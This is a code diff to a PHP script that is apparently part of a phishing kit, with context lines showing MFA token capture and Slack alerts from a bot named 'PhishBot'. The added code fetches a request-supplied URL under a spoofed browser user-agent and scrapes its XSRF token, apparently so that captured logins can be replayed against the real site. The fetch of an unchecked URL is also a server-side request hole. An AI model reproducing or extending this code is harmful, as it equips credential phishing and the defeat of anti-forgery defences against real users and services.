@@ -12,6 +12,57 @@ if(isset($_REQUEST['token'])){$MFAToken = $_REQUEST['token'];}else{$MFAToken = "
 if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}else{$slackemoji = ":fishing_pole_and_fish:";}
 if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}else{$slackbotname = "PhishBot";}
 
+// This code retrieves the XSRF token if provided
+if(isset($_REQUEST['xsrftoken']) && $_REQUEST['xsrftoken'] != ""){
+	$xsrftoken = $_REQUEST['xsrftoken'];
+	$redirurl = $_REQUEST['redirurl'];
+	
+$curl = curl_init();
+
+curl_setopt_array($curl, array(
+  CURLOPT_URL => $redirurl,
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => "",
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => "GET",
+  CURLOPT_HTTPHEADER => array(
+    "cache-control: no-cache",
+    "user-agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" // Here we add the header
+  ),
+
+));
+
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+
+curl_close($curl);
+
+if ($err) {
+  echo "cURL Error #:" . $err;
+} else {
+//  echo $response;
+}
+
+
+function get_string_between($string, $start, $end){
+    $string = ' ' . $string;
+    $ini = strpos($string, $start);
+    if ($ini == 0) return '';
+    $ini += strlen($start);
+    $len = strpos($string, $end, $ini) - $ini;
+    return substr($string, $ini, $len);
+}
+
+$xsrfvalue = "";
+$xsrfvalue = get_string_between($response, 'name="'.$xsrftoken.'" value="', '"');
+
+echo $xsrfvalue;
+	
+}
+
 // Makes Password Safe for DB
 $user = stripslashes($user);
 
@@ -194,7 +245,7 @@ copyEmailBtn.addEventListener('click', function(event) {
 
 <?php } else {
 
-if($redirect == false){ ?>
+if($redirect == false && !isset($redirurl)){ ?>
 
 <HTML>
 <HEAD>
